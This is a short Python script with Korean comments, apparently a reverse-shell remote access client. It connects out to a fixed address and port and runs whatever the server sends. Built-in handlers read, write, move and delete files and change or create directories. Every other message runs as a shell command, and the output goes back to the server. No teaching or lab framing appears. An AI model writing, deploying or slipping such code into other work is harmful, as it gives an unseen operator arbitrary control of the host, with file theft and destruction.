import socket
import subprocess
import os

# 서버 주소와 포트
server_address = ('10.88.38.251', 1236)

# 소켓 생성
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 서버에 연결
client_socket.connect(server_address)

while True:
    # 서버로부터 메시지 수신
    message = client_socket.recv(4096).decode()

    if message.startswith("cd "):
        # 디렉토리 변경 명령어 처리
        directory = message[3:].strip()  # 'cd ' 제거 후 좌우 공백 제거
        try:
            os.chdir(directory)
            result = f"디렉토리 변경 완료: {os.getcwd()}"
        except FileNotFoundError:
            result = "디렉토리를 찾을 수 없습니다."
    elif message.startswith("mkdir "):
        # 디렉토리 생성 명령어 처리
        directory = message[6:].strip()  # 'mkdir ' 제거 후 좌우 공백 제거
        try:
            os.mkdir(directory)
            result = f"디렉토리 생성 완료: {os.path.join(os.getcwd(), directory)}"
        except Exception as e:
            result = f"디렉토리 생성 오류: {str(e)}"
    elif message.startswith("delete "):
        # 파일 삭제 명령어 처리
        filename = message[7:].strip()  # 'delete ' 제거 후 좌우 공백 제거
        try:
            os.remove(filename)
            result = f"파일 삭제 완료: {filename}"
        except Exception as e:
            result = f"파일 삭제 오류: {str(e)}"
    elif message.startswith("read "):
        # 파일 읽기 명령어 처리
        filename = message[5:].strip()  # 'read ' 제거 후 좌우 공백 제거
        try:
            with open(filename, 'r') as file:
                content = file.read()
            result = f"파일 내용:\n{content}"
        except Exception as e:
            result = f"파일 읽기 오류: {str(e)}"
    elif message.startswith("move "):
        # 위치 옮기기 명령어 처리
        params = message[5:].split()  # 'move ' 제거 후 공백으로 분리
        if len(params) != 2:
            result = "잘못된 위치 옮기기 명령어입니다."
        else:
            source = params[0]
            destination = params[1]
            try:
                os.rename(source, destination)
                result = f"위치 옮기기 완료: {source} -> {destination}"
            except Exception as e:
                result = f"위치 옮기기 오류: {str(e)}"

    elif message.startswith("write "):
        # 파일 쓰기 명령어 처리
        params = message[6:].split()  # 'write ' 제거 후 첫 번째 줄을 파일명으로, 나머지를 내용으로 사용
        if len(params) != 2:
            result = "잘못된 파일 쓰기 명령어입니다."
        else:
            filename = params[0].strip()
            content = params[1].strip()
            try:
                with open(filename, 'w') as file:
                    file.write(content)
                result = f"파일 쓰기 완료: {filename}"
            except Exception as e:
                result = f"파일 쓰기 오류: {str(e)}"
    
    else:
        # 윈도우 명령어 실행
        try:
            result = subprocess.getoutput(message)
        except Exception as e:
            result = f"명령어 실행 오류: {str(e)}"

    

    # 결과 전송
    client_socket.sendall(result.encode())

# 소켓 닫기
client_socket.close()
